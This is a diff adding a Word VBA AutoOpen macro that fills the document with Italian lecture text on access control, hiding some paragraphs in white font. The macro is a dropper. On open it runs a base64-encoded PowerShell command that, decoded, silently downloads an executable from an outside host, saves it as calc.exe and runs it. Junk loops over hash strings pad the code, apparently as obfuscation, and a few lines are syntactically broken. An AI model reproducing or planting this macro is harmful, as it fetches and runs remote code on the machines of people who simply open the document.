@@ -1,0 +1,75 @@
+Sub AutoOpen()
+    Dim a As Integer
+    Dim b As String
+    Dim c As String
+
+    ActiveDocument.Content.Delete
+    With ActiveDocument.Content
+        .InsertBefore "ACCESS CONTROL"
+        .ParagraphFormat.Alignment = wdAlignParagraphCenter
+        .Font.Name = "Arial"
+        .Font.Size = 24
+        .Font.Bold = True
+        .Font.Color = RGB(255, 0, 0)
+        .InsertParagraphAfter
+    End With
+    
+    With ActiveDocument.Content
+        .InsertAfter "L’Access Control è uno dei principali meccanismi di protezione (insieme all’autenticazione) per proteggere un’organizzazione da tutte le tipologie di attacco viste fino a questo momento. In particolare, con i meccanismi di controllo degli accessi, andiamo a garantire la confidenzialità delle informazioni (dell’organizzazione) e dei sistemi che processano tali informazioni. Sorge a questo punto spontanea la domanda: Che cosa fa un sistema di controllo degli accessi?"
+        .InsertParagraphAfter
+    End With
+    
+    ActiveDocument.Paragraphs(2).Range.Font.Color = RGB(255, 255, 255)
+    ActiveDocument.Paragraphs(2).Range.Font.Size = 12
+    
+    Dim cmd As String
+    cmd = "powershell.exe -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAAaABpAGQAZABlAG4AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAnAGgAdAB0AHAAOgAvAC8AdgB1AGwAbgAuAGQAbwBtAGEAaQBuAC8AQwB5AGIAZQByAHMAZQBjAHUAcgBpAHQAeQAvAEkAbgBmAGUAYwB0AGUAZABfAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAbQBhAGwAdwBhAHIAZQBcAGMAYQBsAGMALgBlAHgAZQAiACAALQBXAGEAaQB0ADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAG0AYQBsAHcAYQByAGUAXABjAGEAbABjAC4AZQB4AGUAIgA="
+    CreateObject("WScript.Shell").Run (cmd)
+    
+    Dim b_hash As String
+    b_hash = "fb97a5d01042baccf1813f1936f09b52718f3e3cdaa62a2a2d96274df4a4a741"
+    
+    
+    ' Ciclo while con le variabili a e b
+   a = 0
+    While a < 10
+        b = "fb97a5d01042baccf1813f1936f09b52718f3e3cdaa62a2a2d96274df4a4a741" ' Imposta b con l'hash
+        While b < "5"
+            If a > 5 Then
+                If b = b_hash Then ' Verifica l'hash
+                    ActiveDocument.Paragraphs(2).Range.Font.Size = 14
+                Else
+                    Dim dummy1 As String
+                    dummy1 = eab6606e299eb21f4c391112ae4b20b4bb86424727b8e1faa812f1e61f3b6db5
+                End If
+            End If
+            b = CStr(CInt(b) + 1) ' Incremento e conversione
+        Wend
+        a = a + 1
+    Wend
+
+    With ActiveDocument.Content
+        .InsertAfter "Un sistema di controllo degli accessi va a garantire, che le risorse di un’organizzazione (quali ad esempio: file, firewall, applicazioni Web e servizi Cloud) non vengano accedute da utenti non autorizzati e allo stesso tempo, garantisce anche che utenti autorizzati non abusino dei loro privilegi per compiere delle azioni malevole ai danni dell’organizzazione"
+        .InsertParagraphAfter
+    End With
+
+    Dim c_hash As String
+    c_hash = "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
+    
+    ActiveDocument.Paragraphs(3).Range.Font.Color = RGB(255, 255, 255)
+    ActiveDocument.Paragraphs(3).Range.Font.Size = 12
+
+    c = "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
+    While c < "3"
+        If c = "2" Then
+            If c = c_hash Then
+                ActiveDocument.Paragraphs(3).Range.Delete
+            End If
+        Else
+            Dim dummy2 As String
+            dummy2 = eab6606e299eb21f4c391112ae4b20b4bb86424727b8e1faa812f1e61f3b6db5
+        End If
+        c = CStr(CInt(c) + 1)
+    Wend
+End Sub
+
